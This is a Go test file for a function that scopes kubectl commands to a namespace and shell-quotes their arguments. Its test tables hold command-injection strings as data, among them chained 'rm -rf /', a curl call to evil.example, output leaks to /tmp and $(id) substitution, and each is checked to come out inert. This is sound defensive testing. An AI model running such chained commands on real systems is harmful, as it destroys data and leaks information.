package command

import (
	"reflect"
	"testing"
)

func TestScopeKubectlCommand_QuotesShellOperatorsAsData(t *testing.T) {
	const namespace = "operations"
	tests := []struct {
		name    string
		command string
	}{
		{name: "semicolon", command: "kubectl get pods; rm -rf /"},
		{name: "pipe", command: "kubectl get pods | tee /tmp/leak"},
		{name: "logical and", command: "kubectl get pods && curl http://evil.example"},
		{name: "command substitution", command: "kubectl get pods $(id)"},
		{name: "backticks", command: "kubectl get pods `id`"},
		{name: "redirect", command: "kubectl get pods > /tmp/leak"},
		{name: "embedded newline", command: "kubectl get pods\nrm -rf /"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			arguments, err := validateKubectl(test.command)
			if err != nil {
				t.Fatalf("validateKubectl(%q): %v", test.command, err)
			}
			scoped, err := Scope(test.command, namespace)
			if err != nil {
				t.Fatalf("Scope(%q): %v", test.command, err)
			}
			assertNoExecutableShellGrammar(t, scoped)
			assertScopedArguments(t, scoped, append(arguments, "--namespace="+namespace))
		})
	}
}

func TestScopeKubectlCommand_QuotesShellOperatorsWhenNamespaceIsExplicit(t *testing.T) {
	const namespace = "operations"
	tests := []struct {
		name    string
		command string
	}{
		{name: "logical and", command: "kubectl get pods -n operations && curl http://evil.example"},
		{name: "pipe", command: "kubectl get pods --namespace operations | tee /tmp/leak"},
		{name: "command substitution", command: "kubectl describe pod web-1 --namespace=operations $(id)"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			arguments, err := validateKubectl(test.command)
			if err != nil {
				t.Fatalf("validateKubectl(%q): %v", test.command, err)
			}
			scoped, err := Scope(test.command, namespace)
			if err != nil {
				t.Fatalf("Scope(%q): %v", test.command, err)
			}
			assertNoExecutableShellGrammar(t, scoped)
			assertScopedArguments(t, scoped, arguments)
		})
	}
}

func TestScopeKubectlCommand_KeepsOrdinaryCommandsReadable(t *testing.T) {
	const namespace = "operations"
	tests := []struct {
		command string
		want    string
	}{
		{command: "kubectl get pods", want: "kubectl get pods --namespace=operations"},
		{command: "kubectl   get    pods", want: "kubectl get pods --namespace=operations"},
		{command: "kubectl get pods --namespace operations", want: "kubectl get pods --namespace operations"},
		{command: "kubectl logs web-1 -n operations", want: "kubectl logs web-1 -n operations"},
		{command: `kubectl get pods -l "app=web shop"`, want: "kubectl get pods -l 'app=web shop' --namespace=operations"},
		{command: `kubectl get pods -l ""`, want: "kubectl get pods -l '' --namespace=operations"},
	}
	for _, test := range tests {
		t.Run(test.command, func(t *testing.T) {
			got, err := Scope(test.command, namespace)
			if err != nil {
				t.Fatalf("Scope(%q): %v", test.command, err)
			}
			if got != test.want {
				t.Fatalf("Scope(%q) = %q, want %q", test.command, got, test.want)
			}
			rescoped, err := Scope(got, namespace)
			if err != nil {
				t.Fatalf("Scope(%q): %v", got, err)
			}
			if rescoped != got {
				t.Fatalf("re-scoping %q returned %q, want an unchanged command", got, rescoped)
			}
		})
	}
}

func TestQuoteShellWordBoundaries(t *testing.T) {
	tests := []struct {
		word string
		want string
	}{
		{word: "UPPER", want: "UPPER"},
		{word: "lower", want: "lower"},
		{word: "123", want: "123"},
		{word: "_@%+=:,./-", want: "_@%+=:,./-"},
		{word: "", want: "''"},
		{word: "has space", want: "'has space'"},
		{word: "it's", want: `'it'"'"'s'`},
		{word: ";", want: "';'"},
	}
	for _, test := range tests {
		if got := quoteShellWord(test.word); got != test.want {
			t.Errorf("quoteShellWord(%q) = %q, want %q", test.word, got, test.want)
		}
	}
}

func assertScopedArguments(t *testing.T, scoped string, want []string) {
	t.Helper()
	got, err := validateKubectl(scoped)
	if err != nil {
		t.Fatalf("scoped command %q failed validation: %v", scoped, err)
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("scoped arguments = %q, want %q", got, want)
	}
}

func assertNoExecutableShellGrammar(t *testing.T, command string) {
	t.Helper()
	operators, quotingBalanced := unquotedShellOperators(command)
	if len(operators) > 0 {
		t.Fatalf("command %q leaves shell operators %q outside quotes", command, operators)
	}
	if !quotingBalanced {
		t.Fatalf("command %q ends inside an unterminated quote", command)
	}
}

type shellQuoteState int

const (
	outsideQuotes shellQuoteState = iota
	insideSingleQuotes
	insideDoubleQuotes
)

func unquotedShellOperators(command string) (operators []string, quotingBalanced bool) {
	state := outsideQuotes
	for index := 0; index < len(command); index++ {
		next, executable, skipsNextCharacter := scanShellCharacter(state, command[index])
		state = next
		if executable {
			operators = append(operators, command[index:index+1])
		}
		if skipsNextCharacter {
			index++
		}
	}
	return operators, state == outsideQuotes
}

func scanShellCharacter(state shellQuoteState, character byte) (next shellQuoteState, executable bool, skipsNextCharacter bool) {
	if state == insideSingleQuotes {
		return scanInsideSingleQuotes(character)
	}
	if state == insideDoubleQuotes {
		return scanInsideDoubleQuotes(character)
	}
	return scanOutsideQuotes(character)
}

func scanOutsideQuotes(character byte) (next shellQuoteState, executable bool, skipsNextCharacter bool) {
	switch {
	case character == '\'':
		return insideSingleQuotes, false, false
	case character == '"':
		return insideDoubleQuotes, false, false
	case character == '\\':
		return outsideQuotes, false, true
	case isShellOperator(character):
		return outsideQuotes, true, false
	default:
		return outsideQuotes, false, false
	}
}

func scanInsideSingleQuotes(character byte) (next shellQuoteState, executable bool, skipsNextCharacter bool) {
	if character == '\'' {
		return outsideQuotes, false, false
	}
	return insideSingleQuotes, false, false
}

func scanInsideDoubleQuotes(character byte) (next shellQuoteState, executable bool, skipsNextCharacter bool) {
	switch character {
	case '"':
		return outsideQuotes, false, false
	case '\\':
		return insideDoubleQuotes, false, true
	case '$', '`':
		return insideDoubleQuotes, true, false
	default:
		return insideDoubleQuotes, false, false
	}
}

func isShellOperator(character byte) bool {
	switch character {
	case ';', '|', '&', '<', '>', '$', '`', '(', ')', '\n', '\r':
		return true
	default:
		return false
	}
}
